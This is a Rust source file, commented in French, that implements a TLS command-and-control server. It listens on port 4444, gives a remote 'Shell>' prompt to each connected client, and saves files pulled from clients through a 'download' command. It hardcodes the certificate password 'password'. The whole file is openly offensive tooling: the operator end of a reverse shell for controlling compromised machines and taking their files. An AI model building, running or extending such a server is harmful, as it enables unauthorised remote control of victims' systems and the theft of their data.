use std::fs::File;
use std::io::{self, Read, Write, BufRead};
use std::net::TcpListener;
use native_tls::{Identity, TlsAcceptor};
use std::thread;
use std::sync::Arc;

fn main() {
    println!("Démarrage du Serveur C2 en Rust...");

    // 1. Charger l'identité
    let mut file = File::open("identity.pfx").expect("ERREUR CRITIQUE: Fichier identity.pfx introuvable !");
    let mut identity_bytes = vec![];
    file.read_to_end(&mut identity_bytes).unwrap();
    
    // Si le mot de passe est incorrect, ça paniquera ici
    let identity = Identity::from_pkcs12(&identity_bytes, "password").expect("Mauvais mot de passe pour le certificat !");
    let acceptor = TlsAcceptor::new(identity).unwrap();
    let acceptor = Arc::new(acceptor);

    // 2. Écouter sur le port 4444
    let listener = TcpListener::bind("0.0.0.0:4444").unwrap();
    println!("[*] En écoute sur le port 4444 (TLS)...");

    // BOUCLE INFINIE (On ne break plus !)
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let acceptor = acceptor.clone();
                
                // On lance un thread pour gérer ce client
                thread::spawn(move || {
                    println!("[*] Tentative de connexion entrante...");
                    
                    // On gère le handshake TLS proprement sans unwrap() qui ferait crasher le thread
                    match acceptor.accept(stream) {
                        Ok(mut stream) => {
                            println!("[+] Handshake TLS réussi ! Client connecté et sécurisé.");

                            loop {
                                // A. Lire la commande serveur
                                print!("Shell> ");
                                io::stdout().flush().unwrap();
                                
                                let mut command = String::new();
                                io::stdin().read_line(&mut command).unwrap();
                                let command = command.trim();

                                if command.is_empty() { continue; }
                                // Si on tape exit, on ferme juste ce client, pas le serveur
                                if command == "exit" { 
                                    println!("[-] Fermeture de la session client.");
                                    break; 
                                }

                                // B. Envoyer au client
                                if let Err(e) = stream.write_all(format!("{}\n", command).as_bytes()) {
                                    println!("[-] Erreur d'envoi (Client déconnecté ?): {}", e);
                                    break;
                                }

                                // C. Lire la réponse
                                let mut buffer = [0; 65536]; 
                                match stream.read(&mut buffer) {
                                    Ok(n) => {
                                        if n == 0 { 
                                            println!("[-] Le client a fermé la connexion.");
                                            break; 
                                        }
                                        
                                        // D. Gestion DOWNLOAD
                                        if command.starts_with("download") {
                                            let parts: Vec<&str> = command.split_whitespace().collect();
                                            if parts.len() >= 2 {
                                                let filename = parts[1];
                                                println!("[*] Réception du fichier '{}' ({} octets)...", filename, n);
                                                
                                                match File::create(filename) {
                                                    Ok(mut file) => {
                                                        // CORRECTION ICI (le &buffer)
                                                        file.write_all(&buffer[0..n]).unwrap();
                                                        println!("[+] Fichier sauvegardé !");
                                                    },
                                                    Err(e) => println!("[-] Erreur disque: {}", e),
                                                }
                                            }
                                        } else {
                                            // Affichage standard
                                            let response = String::from_utf8_lossy(&buffer[0..n]);
                                            println!("{}", response);
                                        }
                                    },
                                    Err(e) => {
                                        println!("[-] Erreur de lecture: {}", e);
                                        break;
                                    }
                                }
                            }
                        },
                        Err(e) => {
                            // C'est ici qu'on verra si le certificat pose problème
                            println!("[-] Échec du handshake TLS: {}", e);
                        }
                    }
                });
            }
            Err(e) => { println!("[-] Erreur de connexion TCP: {}", e); }
        }
    }
}